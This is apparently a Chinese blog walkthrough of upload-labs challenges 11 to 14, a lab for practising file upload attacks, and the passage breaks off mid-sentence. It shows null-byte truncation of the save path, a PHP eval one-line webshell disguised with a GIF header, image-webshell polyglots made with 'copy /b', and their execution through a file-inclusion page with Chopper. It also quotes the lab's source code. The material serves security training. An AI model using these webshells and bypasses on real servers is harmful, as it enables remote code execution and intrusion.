            "content_html": "<h1 id=\"特殊的文件上传漏洞一\"><a class=\"markdownIt-Anchor\" href=\"#特殊的文件上传漏洞一\">#</a> 特殊的文件上传漏洞（一）</h1>\n<p>我们来讲讲特殊的文件上传漏洞（一）。</p>\n<h2 id=\"get-00截断绕过\"><a class=\"markdownIt-Anchor\" href=\"#get-00截断绕过\">#</a> GET-00 截断绕过</h2>\n<p>Pass-11</p>\n<p>抓包，看到在请求的 url 上出现了敏感的字符，save_path=…/upload/</p>\n<p><img src=\"image-20221003220951062.png\" alt=\"image-20221003220951062\"></p>\n<p>出现这样的字样，我们首先需要想想，这个上传保存路径是否可控？</p>\n<p>首先为了上传成功首先得把 backdoor.php 改成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=&quot;backdoor.jpg&quot;</span><br></pre></td></tr></table></figure>\n<p>接下来我们猜想，save_path 可以指定某个路径存储，我们可以让它存在别的地方嘛？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">save_path=../ </span><br></pre></td></tr></table></figure>\n<p>上传成功</p>\n<p><img src=\"image-20221003221405064.png\" alt=\"image-20221003221405064\"></p>\n<p>确实生成了</p>\n<p><img src=\"image-20221003221432601.png\" alt=\"image-20221003221432601\"></p>\n<p>那也就是说，控制 save_path 是可行的，但想到如果 save_path 变成一个文件路径的话，应该会报错。果不其然</p>\n<p><img src=\"image-20221003221709058.png\" alt=\"image-20221003221709058\"></p>\n<p>如果 <code>能有这么一种方法</code> ，能让 save_path<strong> 直接成为最后保存的文件路径该多好</strong>，比如 <code>save_path=../upload/11.php</code></p>\n<p>虽然上传的是 backdoor.jpg，但存储的时候直接就成了 php 格式。有办法做到么？有！答案就是 GET-00 截断、</p>\n<p>只需要修改：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">save_path=../upload/<span class=\"number\">11</span>.php%<span class=\"number\">00</span></span><br></pre></td></tr></table></figure>\n<p>成功上传不报错</p>\n<p><img src=\"image-20221003221909843.png\" alt=\"image-20221003221909843\"></p>\n<p>upload/11.php 也生成了</p>\n<p><img src=\"image-20221003221948845.png\" alt=\"image-20221003221948845\"></p>\n<p>菜刀正常连接。搞定！</p>\n<p>除了在 url 里加 %00 之外，有些时候，也可以在 filename 里加</p>\n<p>比如这样改</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.jpg+&quot;</span></span><br></pre></td></tr></table></figure>\n<p>然后在 hex 里找到 + 的位置（十六进制为 2b），将其替换成 00</p>\n<p><img src=\"image-20221003222306181.png\" alt=\"image-20221003222306181\"></p>\n<p>其实用到的原理就是： <code>00截断</code> 就是借 php 解析字符串的时候 <code>遇到00截断停止，不再解析</code> 的特点，把文件路径提前 <code>错误地识别成了文件</code> （<strong>本应该是路径才对</strong>）。</p>\n<p>这就衍生出了，post-00 截断</p>\n<h2 id=\"post-00截断绕过\"><a class=\"markdownIt-Anchor\" href=\"#post-00截断绕过\">#</a> POST-00 截断绕过</h2>\n<p>Pass-12</p>\n<p>save_path 出现在了 POST 请求的参数区</p>\n<p><img src=\"image-20221003224305275.png\" alt=\"image-20221003224305275\"></p>\n<p>那么我们可以这样构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">../upload/123.php+</span><br><span class=\"line\">filename=&quot;backdoor.png&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003224407296.png\" alt=\"image-20221003224407296\"></p>\n<p>然后在 hex 中修改 + 的十六进制 0x2b 为 00</p>\n<p><img src=\"image-20221003224514879.png\" alt=\"image-20221003224514879\"></p>\n<p>上传成功</p>\n<p><img src=\"image-20221003224555355.png\" alt=\"image-20221003224555355\"></p>\n<p>菜刀也可以成功连接 123.php 文件</p>\n<p><img src=\"image-20221003224620743.png\" alt=\"image-20221003224620743\"></p>\n<h2 id=\"图片马绕过白名单绕过\"><a class=\"markdownIt-Anchor\" href=\"#图片马绕过白名单绕过\">#</a> 图片马绕过 (白名单绕过)</h2>\n<p>Pass-13</p>\n<p><img src=\"image-20221003230438023.png\" alt=\"image-20221003230438023\"></p>\n<p>本题考察对于文件头解析 + 图片马合成</p>\n<h3 id=\"绕过文件头解析\"><a class=\"markdownIt-Anchor\" href=\"#绕过文件头解析\">#</a> 绕过文件头解析</h3>\n<p>常用文件头：</p>\n<ul>\n<li><code>.jpeg</code> ;  <code>.jpe</code> ;  <code>.jpg</code> ,  <code>&quot;JPGGraphic File&quot;</code></li>\n<li><code>.gif</code> , <code> &quot;GIF 89A&quot;</code></li>\n<li><code>.zip</code> ,  <code>&quot;Zip Compressed&quot;</code></li>\n<li><code>.doc</code> ;  <code>.xls</code> ;  <code>.xlt</code> ;  <code>.ppt</code> ;  <code>.apr</code> ,  <code>&quot;MS Compound Document v1 or Lotus Approach APRfile&quot;</code></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">JPEG（jpg），文件头：FFD8FF</span><br><span class=\"line\"></span><br><span class=\"line\">PNG（png），文件头：89504E47</span><br><span class=\"line\"></span><br><span class=\"line\">GIF（gif），文件头：47494638</span><br><span class=\"line\"></span><br><span class=\"line\">Windows Bitmap（bmp），文件头：424D</span><br><span class=\"line\"></span><br><span class=\"line\">CAD（dwg），文件头：41433130</span><br><span class=\"line\"></span><br><span class=\"line\">Adobe Photoshop（psd），文件头：38425053</span><br><span class=\"line\"></span><br><span class=\"line\">Rich Text Format（rtf），文件头：7B5C727466</span><br><span class=\"line\"></span><br><span class=\"line\">XML（xml），文件头：3C3F786D6C</span><br><span class=\"line\"></span><br><span class=\"line\">HTML（html），文件头：68746D6C3E</span><br><span class=\"line\"></span><br><span class=\"line\">Email [thorough only]（eml），文件头：44656C6976572792D646174653A</span><br><span class=\"line\"></span><br><span class=\"line\">Outlook Express（dbx），文件头：CFAD12FEC5FD746F</span><br><span class=\"line\"></span><br><span class=\"line\">Outlook（pst），文件头：2142444E</span><br><span class=\"line\"></span><br><span class=\"line\">Ms Word/Excel（xls.or.doc），文件头：D0CF11E0</span><br><span class=\"line\"></span><br><span class=\"line\">Ms Access（mdb），文件头：5374616E64617264204A</span><br><span class=\"line\"></span><br><span class=\"line\">WordPerfect（wpd），文件头：FF575043</span><br><span class=\"line\"></span><br><span class=\"line\">Adobe Acrobat（pdf），文件头：255044462D312E</span><br><span class=\"line\"></span><br><span class=\"line\">Quicken（qdf），文件头：AC9EBD8F</span><br><span class=\"line\"></span><br><span class=\"line\">Windows Password（pwl），文件头：E3828596</span><br><span class=\"line\"></span><br><span class=\"line\">ZIP Archive（zip），文件头：504B0304</span><br><span class=\"line\"></span><br><span class=\"line\">RAR Archive（rar），文件头：52617221</span><br><span class=\"line\"></span><br><span class=\"line\">Wave（wav），文件头：57415645</span><br><span class=\"line\"></span><br><span class=\"line\">AVI（avi），文件头：41564920</span><br><span class=\"line\"></span><br><span class=\"line\">Real Audio（ram），文件头：2E7261FD</span><br><span class=\"line\"></span><br><span class=\"line\">Real Media（rm），文件头：2E524D46</span><br><span class=\"line\"></span><br><span class=\"line\">MPEG（mpg），文件头：000001BA</span><br><span class=\"line\"></span><br><span class=\"line\">MPEG（mpg），文件头：000001B3</span><br><span class=\"line\"></span><br><span class=\"line\">QuickTime（mov），文件头：6D6F6F76</span><br><span class=\"line\"></span><br><span class=\"line\">Windows Media（asf），文件头：3026B2758E66CF11</span><br><span class=\"line\"></span><br><span class=\"line\">MIDI（mid），文件头：4D546864</span><br></pre></td></tr></table></figure>\n<p>有些 web 程序会根据传上来文件的头几个字节来判断是属于什么类型，比如 GIF 的魔术字是 <code>GIF 89A</code></p>\n<p>我们尝试在一句话木马前面增加 <code>GIF 89A</code> ：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GIF 89A</span><br><span class=\"line\">&lt;?php @eval($_POST[margin]);?&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003232704271.png\" alt=\"image-20221003232704271\"></p>\n<p>可以看到成功被识别成了 gif 而上传给了服务器</p>\n<p>我们将此路径 <code>./upload/5020221003232644.gif</code>  拷贝，<strong>注意只拷贝一个点</strong></p>\n<p>发现题目还给了一个文件包含的链接</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"variable\">$file</span>;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(__file__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n<p>当前 <code>http://www.upload_lab.com/include.php</code>  页面，可以接收一个 <code>GET型参数</code> <strong> file</strong>，我们如下构造：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//www.upload_lab.com/include.php?file=./upload/5020221003232644.gif</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003233246265.png\" alt=\"image-20221003233246265\"></p>\n<p>可以发现，只显示了 GIF 89A，一句话木马没有显示在页面，说明成功解析成了 php。</p>\n<p>菜刀连接，成功：</p>\n<p><img src=\"image-20221003233349810.png\" alt=\"image-20221003233349810\"></p>\n<h3 id=\"绕过unpack头两字节\"><a class=\"markdownIt-Anchor\" href=\"#绕过unpack头两字节\">#</a> 绕过 unpack 头两字节</h3>\n<p>使用 windows 的 copy 命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">copy /?</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003233804358.png\" alt=\"image-20221003233804358\"></p>\n<p>我们准备两个文件，一个是正常的 png 图片 <code>webshell.png</code> ，一个是一句话木马的 php 文件 <code>backdoor.php</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">copy webshell.png /b + backdoor.php /b backdoor.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003234531986.png\" alt=\"image-20221003234531986\"></p>\n<p>那么可以上传这个文件，可以看到成功上传</p>\n<p><img src=\"image-20221003234801987.png\" alt=\"image-20221003234801987\"></p>\n<p><img src=\"image-20221003234900575.png\" alt=\"image-20221003234900575\"></p>\n<p>菜刀成功连接：</p>\n<p><img src=\"image-20221003234932717.png\" alt=\"image-20221003234932717\"></p>\n<p>回过头来看源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getReailFileType</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"variable\">$filename</span>, <span class=\"string\">&quot;rb&quot;</span>); <span class=\"comment\">//只读方式打开，读取字节</span></span><br><span class=\"line\">    <span class=\"variable\">$bin</span> = <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$file</span>, <span class=\"number\">2</span>); <span class=\"comment\">//只读2字节</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);<span class=\"comment\">//关闭文件</span></span><br><span class=\"line\">    <span class=\"variable\">$strInfo</span> = @<span class=\"title function_ invoke__\">unpack</span>(<span class=\"string\">&quot;C2chars&quot;</span>, <span class=\"variable\">$bin</span>);<span class=\"comment\">//将$bin解包，C：有序的字符 2:2个 chars：变成chars array</span></span><br><span class=\"line\">    <span class=\"variable\">$typeCode</span> = <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$strInfo</span>[<span class=\"string\">&#x27;chars1&#x27;</span>].<span class=\"variable\">$strInfo</span>[<span class=\"string\">&#x27;chars2&#x27;</span>]); <span class=\"comment\">//chars1=“xxx&quot;,  chars2=&quot;xxxx&quot;,将这两个字符串拼接后变成整数付给$typeCode</span></span><br><span class=\"line\">    <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;&#x27;</span>; </span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(<span class=\"variable\">$typeCode</span>)&#123;      </span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">255216</span>:            </span><br><span class=\"line\">            <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;jpg&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">13780</span>:            </span><br><span class=\"line\">            <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;png&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;        </span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">7173</span>:            </span><br><span class=\"line\">            <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;gif&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:            </span><br><span class=\"line\">            <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;unknown&#x27;</span>;</span><br><span class=\"line\">        &#125;    </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$fileType</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$file_type</span> = <span class=\"title function_ invoke__\">getReailFileType</span>(<span class=\"variable\">$temp_file</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$file_type</span> == <span class=\"string\">&#x27;unknown&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&quot;/&quot;</span>.<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">10</span>, <span class=\"number\">99</span>).<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_type</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中，isset 函数通过下面的会很好理解：</p>\n<ul>\n<li>就是一个变量已声明，且不为 NULL（可以是’ '）时，会返回真。</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 结果为 TRUE，所以后边的文本将被打印出来。</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$var</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;This var is set so I will print.&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 在后边的例子中，我们将使用 var_dump 输出 isset() 的返回值。</span></span><br><span class=\"line\"><span class=\"comment\">// the return value of isset().</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"string\">&quot;test&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"string\">&quot;anothertest&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>));      <span class=\"comment\">// TRUE</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>, <span class=\"variable\">$b</span>)); <span class=\"comment\">// TRUE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">unset</span> (<span class=\"variable\">$a</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>));     <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>, <span class=\"variable\">$b</span>)); <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$foo</span> = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$foo</span>));   <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">array</span> (<span class=\"string\">&#x27;test&#x27;</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">&#x27;hello&#x27;</span> =&gt; <span class=\"literal\">NULL</span>, <span class=\"string\">&#x27;pie&#x27;</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;a&#x27;</span> =&gt; <span class=\"string\">&#x27;apple&#x27;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&#x27;test&#x27;</span>]));            <span class=\"comment\">// TRUE</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&#x27;foo&#x27;</span>]));             <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&#x27;hello&#x27;</span>]));           <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 键 &#x27;hello&#x27; 的值等于 NULL，所以被认为是未置值的。</span></span><br><span class=\"line\"><span class=\"comment\">// 如果想检测 NULL 键值，可以试试下边的方法。 </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">array_key_exists</span>(<span class=\"string\">&#x27;hello&#x27;</span>, <span class=\"variable\">$a</span>)); <span class=\"comment\">// TRUE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Checking deeper array values</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&#x27;pie&#x27;</span>][<span class=\"string\">&#x27;a&#x27;</span>]));        <span class=\"comment\">// TRUE</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&#x27;pie&#x27;</span>][<span class=\"string\">&#x27;b&#x27;</span>]));        <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&#x27;cake&#x27;</span>][<span class=\"string\">&#x27;a&#x27;</span>][<span class=\"string\">&#x27;b&#x27;</span>]));  <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"绕过getimagesize\"><a class=\"markdownIt-Anchor\" href=\"#绕过getimagesize\">#</a> 绕过 getimagesize</h3>\n<p>Pass-14 和 Pass-13 绕过方式一样，同样 <code>上传图片copy拼接马</code> 即可。</p>\n<p>我们直接来看源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isImage</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$types</span> = <span class=\"string\">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">file_exists</span>(<span class=\"variable\">$filename</span>))&#123;<span class=\"comment\">//传进来的非空</span></span><br><span class=\"line\">        <span class=\"variable\">$info</span> = <span class=\"title function_ invoke__\">getimagesize</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"variable\">$ext</span> = <span class=\"title function_ invoke__\">image_type_to_extension</span>(<span class=\"variable\">$info</span>[<span class=\"number\">2</span>]);<span class=\"comment\">//我们只需要提取图像信息中的【索引2】，也就是类型信息</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$types</span>,<span class=\"variable\">$ext</span>)&gt;=<span class=\"number\">0</span>)&#123;<span class=\"comment\">//从$types(类型集合)里面寻找$ext(当前上传图像类型)第一次出现的位置</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$ext</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$res</span> = <span class=\"title function_ invoke__\">isImage</span>(<span class=\"variable\">$temp_file</span>);<span class=\"comment\">//调用isImage函数，参数为上传到服务器的临时文件名。返回值为上传文件类型，或者false</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"variable\">$res</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&quot;/&quot;</span>.<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">10</span>, <span class=\"number\">99</span>).<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"variable\">$res</span>;<span class=\"comment\">//如果$res不为false，那就是拼接上传路径+/+随机数+时间戳+后缀</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;<span class=\"comment\">//将临时文件移动给新的永久路径上</span></span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中，getimagesize () 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$remote_png_url</span> = <span class=\"string\">&#x27;http://www.runoob.com/wp-content/themes/w3cschool.cc/assets/img/logo-domain-green2.png&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$img_data</span> = <span class=\"title function_ invoke__\">getimagesize</span>(<span class=\"variable\">$remote_png_url</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$img_data</span> );</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">输出为：</span><br><span class=\"line\"><span class=\"title function_ invoke__\">Array</span></span><br><span class=\"line\">(</span><br><span class=\"line\">    [<span class=\"number\">0</span>] =&gt; <span class=\"number\">290</span></span><br><span class=\"line\">    [<span class=\"number\">1</span>] =&gt; <span class=\"number\">69</span></span><br><span class=\"line\">    [<span class=\"number\">2</span>] =&gt; <span class=\"number\">3</span></span><br><span class=\"line\">    [<span class=\"number\">3</span>] =&gt; width=<span class=\"string\">&quot;290&quot;</span> height=<span class=\"string\">&quot;69&quot;</span></span><br><span class=\"line\">    [bits] =&gt; <span class=\"number\">8</span></span><br><span class=\"line\">    [mime] =&gt; image/png</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p><strong>返回结果说明</strong></p>\n<ul>\n<li>索引 0 给出的是图像 <code>宽度</code> 的像素值</li>\n<li>索引 1 给出的是图像 <code>高度</code> 的像素值</li>\n<li>索引 2 给出的是图像的 <code>类型</code> ，返回的是数字，其中 1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF (intel byte order)，8 = TIFF (motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li>\n<li>索引 3 给出的是一个 <code>宽度和高度的字符串</code> ，可以直接用于 HTML 的 image 标签</li>\n<li>索引 bits 给出的是图像的 <code>每种颜色的位数</code> ，二进制格式</li>\n<li>索引 channels 给出的是图像的 <code>通道值</code> ，RGB 图像 <code>默认是 3</code></li>\n<li>索引 mime 给出的是图像的 <code> MIME 信息</code> ，此信息可以用来在 HTTP  <code>Content-type </code> 头信息中发送正确的信息，如： header (“Content-type: image/jpeg”);</li>\n</ul>\n<p>stripos () 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p>\n<p>stripos(<em><strong>string</strong>,<strong>find</strong>,start</em>)</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">参数</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>string</strong></td>\n<td style=\"text-align:left\"><strong>必需。规定被搜索的字符串。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>find</strong></td>\n<td style=\"text-align:left\"><strong>必需。规定要查找的字符。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><em>start</em></td>\n<td style=\"text-align:left\">可选。规定开始搜索的位置。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"绕过exif_imagety\"><a class=\"markdownIt-Anchor\" href=\"#绕过exif_imagety\">#</a> 绕过 exif_imagety</h3>\n<p>exif_imagetype () 函数是 PHP 中的内置函数，用于确定图像的类型。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">int exif_imagetype( string $filename )</span><br></pre></td></tr></table></figure>\n<p><strong>参数</strong>：该函数接受单个参数 $filename，该参数保存图像的名称或 URL。</p>\n<p><strong>返回值</strong>：此函数返回与 